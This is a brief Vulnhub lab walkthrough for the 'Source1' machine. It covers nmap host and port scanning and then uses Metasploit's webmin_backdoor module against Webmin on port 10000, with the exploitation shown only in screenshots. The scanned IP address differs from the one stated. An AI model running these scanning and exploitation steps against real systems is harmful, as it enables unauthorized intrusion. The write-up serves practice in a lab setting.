## Source1 Vulnhub Walkthrough

Hey there, Hope you are doing great.

### Let's start:
First, we need to know the IP address of our target VM.
Commands to use:
```
$ nmap -sn -vvv 192.168.1.0/24 
or
$ sudo netdiscover
```
The VM is running on 192.168.1.79 in my machine.
\
Now, let's scan the ports of the target machine.
> nmap -sC -sV -p- -T4 192.168.1.74 -oN results.log

Nmap flags usage:
```
-sC : For default script scan.
-sV : For version scanning.
-p- : Full port scan (i.e 0-65536).
-T4 : Scan Speed.
-oN : Save the results in a file.
```

**Nmap Result:**

![](https://github.com/ninchy0/vulnhub-writeups/blob/main/Source1/Nmap-Result.PNG)

So, it seems like there's only 2 ports running on our vulnerable machine (i.e 22 and 10000).
A WebMin web server is running on port 10000 as seen in the nmap result.

![](https://github.com/ninchy0/vulnhub-writeups/blob/main/Source1/Login-Form.PNG)

Commands to search for the exploit and use it.
```
$ msfconsole
$ search WebMin
$ use exploit/linux/http/webmin_backdoor
```



**Exploitation:** 

![](https://github.com/ninchy0/vulnhub-writeups/blob/main/Source1/Exploitation1.PNG)
![](https://github.com/ninchy0/vulnhub-writeups/blob/main/Source1/Exploitation2.PNG)
![](https://github.com/ninchy0/vulnhub-writeups/blob/main/Source1/Exploitation3.PNG)
![](https://github.com/ninchy0/vulnhub-writeups/blob/main/Source1/Exploitation4.PNG)


**Things to remember:**
- Set the ssl to true while exploiting using msfconsole.
- To make things easy, add "<target_ip>    source" in /etc/hosts.